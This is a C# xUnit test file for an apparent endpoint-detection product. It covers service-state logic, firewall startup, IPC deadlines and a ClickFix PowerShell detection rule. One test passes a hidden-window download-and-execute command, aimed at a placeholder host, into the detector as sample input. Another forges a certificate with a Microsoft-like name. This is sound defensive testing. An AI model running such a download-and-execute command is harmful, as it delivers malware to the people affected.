using System;
using System.IO;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Extensions.Logging.Abstractions;
using Sentinel.Core;
using Xunit;

namespace Sentinel.Tests
{
    public class ServiceAvailabilityRegressionTests
    {
        [Fact]
        public void MissingCertificateMarkersRemainUnverifiedWithoutRemovalOrAttackAuthority()
        {
            using var rsa = RSA.Create(2048);
            var request = new CertificateRequest("CN=Microsoft Windows Hardware Compatibility", rsa, HashAlgorithmName.SHA256, RSASignaturePadding.Pkcs1);
            using var cert = request.CreateSelfSigned(DateTimeOffset.UtcNow.AddYears(-20), DateTimeOffset.UtcNow.AddYears(-10));
            var finding = Sentinel.Core.Monitors.RootStoreGuard.CreateFinding(cert, cert.Thumbprint, false, 0, "Review only");
            ResponsePolicy.EnforceDispatchPolicy(finding);
            Assert.Equal("TLS: Root Certificate Trust Metadata Unverified", finding.RuleName);
            Assert.Equal(ResponseAction.LogOnly, finding.AuthorizedResponse);
            Assert.Equal(DetectionTier.Tier2Indicator, finding.Tier);
            Assert.Equal("False", finding.Metadata!["Removed"]);
            Assert.True(ResponsePolicy.IsNonCorrelatingObserveNoise(finding));
            Assert.Null(ResponsePolicy.ClassifyTerminalOutcome(finding));
        }
        [Theory]
        [InlineData(false, "Running", "NotResponding")]
        [InlineData(false, "StartPending", "Starting")]
        [InlineData(false, "StopPending", "Stopping")]
        [InlineData(false, "Stopped", "Stopped")]
        [InlineData(false, "Unknown", "Unknown")]
        [InlineData(true, "Unknown", "Responding")]
        public void FailedIpcDoesNotProveServiceStopped(bool ipc, string scm, string state)
            => Assert.Equal(state, ServiceAvailability.State(ipc, scm));

        private sealed class BlockedFirewall : ISelfNetworkFirewall, IDisposable
        {
            internal readonly ManualResetEventSlim Entered = new();
            internal readonly ManualResetEventSlim Release = new();
            public void UpsertAndVerify(SelfNetworkBlockRule rule)
            {
                Entered.Set();
                if (!Release.Wait(TimeSpan.FromSeconds(10))) throw new TimeoutException("Fixture was not released");
            }
            public void Remove(string name) { }
            public void VerifyEnabled() { }
            public void Dispose() { Release.Set(); Entered.Dispose(); Release.Dispose(); }
        }
        [Fact]
        public async Task SlowNativeFirewallCannotBlockHostedServiceStartup()
        {
            using var firewall = new BlockedFirewall();
            using var service = new SelfNetworkIsolationService(firewall, NullLogger<SelfNetworkIsolationService>.Instance);
            var start = Task.Run(() => service.StartAsync(CancellationToken.None));
            try
            {
                Assert.True(firewall.Entered.Wait(TimeSpan.FromSeconds(5)));
                Assert.Same(start, await Task.WhenAny(start, Task.Delay(TimeSpan.FromSeconds(1))));
                await start;
            }
            finally
            {
                firewall.Release.Set(); await start;
                using var stop = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                await service.StopAsync(stop.Token);
            }
        }

        [Fact]
        public async Task OneDeadlineBoundsStalledConnectOrWriteAndLargeRepliesRemainSupported()
        {
            var stalled = new TaskCompletionSource<bool>();
            using var deadline = new CancellationTokenSource(TimeSpan.FromMilliseconds(30));
            await Assert.ThrowsAnyAsync<OperationCanceledException>(() => BoundedIpcRequest.WithinDeadlineAsync(stalled.Task, deadline.Token));
            stalled.SetException(new IOException("Disposed pipe")); // observed after timeout
            string roster = new string('a', 85000);
            Assert.Equal(roster, await BoundedIpcRequest.ReadAsync(new StringReader(roster + "\n"), TimeSpan.FromSeconds(1), CancellationToken.None, 4 * 1024 * 1024));
            await Assert.ThrowsAsync<InvalidDataException>(() => BoundedIpcRequest.ReadAsync(new StringReader("12345"), TimeSpan.FromSeconds(1), CancellationToken.None, 4));
        }

        [Theory]
        [InlineData("conhost")]
        [InlineData("explorer.exe")]
        [InlineData("runtimebroker")]
        public void HiddenTrayPromotionIsNotClickFixAndDoesNotSeedRemoteControlComposite(string parent)
        {
            string command = "powershell.exe -WindowStyle Hidden -NoProfile -NonInteractive -Command \"Set-ItemProperty -Path 'Registry::HKCU\\Control Panel\\NotifyIconSettings\\*' -Name 'IsPromoted' -Value 1 -Type 'DWord';\"";
            var result = new ClickFixDetectionRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessId = 4242, ProcessName = "powershell.exe", CommandLine = command, ParentProcessName = parent }
            });
            Assert.Null(result);
        }
        [Theory]
        [InlineData("-w hidden Get-Date")]
        [InlineData("-WindowStyle Hidden Get-Process")]
        [InlineData("-w h Write-Output 'hello'")]
        public void HiddenWindowAloneIsNotAttackProof(string command)
            => Assert.Null(new ClickFixDetectionRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessId = 4242, ProcessName = "powershell.exe", CommandLine = "powershell.exe " + command, ParentProcessName = "explorer" }
            }));

        [Fact]
        public void HiddenDownloadAndExecutionStillDetects()
        {
            var result = new ClickFixDetectionRule().Evaluate(new FusedTelemetryContext
            {
                TriggeringEvent = new ProcessTelemetry { ProcessId = 4242, ProcessName = "powershell.exe", ParentProcessName = "explorer", CommandLine = "powershell.exe -w hidden Invoke-WebRequest https://example.invalid/payload -OutFile C:\\Temp\\p.exe; Start-Process C:\\Temp\\p.exe" }
            });
            Assert.NotNull(result);
            Assert.Equal(ResponseAction.KillProcessTree, result!.AuthorizedResponse);
        }
    }
}
